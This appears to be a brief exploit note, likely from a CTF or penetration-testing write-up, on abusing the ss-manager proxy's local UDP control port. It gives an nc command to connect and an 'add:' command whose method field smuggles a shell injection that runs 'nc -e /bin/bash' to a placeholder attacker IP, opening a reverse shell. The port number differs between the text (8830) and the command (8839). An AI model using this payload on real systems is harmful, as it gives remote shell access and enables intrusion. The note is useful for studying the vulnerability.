# ss_manager
* The ss-manager is a proxy things that uses UDP port 8830 to get control
commands on 127.0.0.1.
  so we have to connect to this port and exploit the LCE.
  `nc -u 127.0.0.1 8839`

   then, adding the malicious command:
   `add: {"server_port":8003, "password":"test", "method":"||nc -e /bin/bash
   <attacker_IP> <port>||"}`
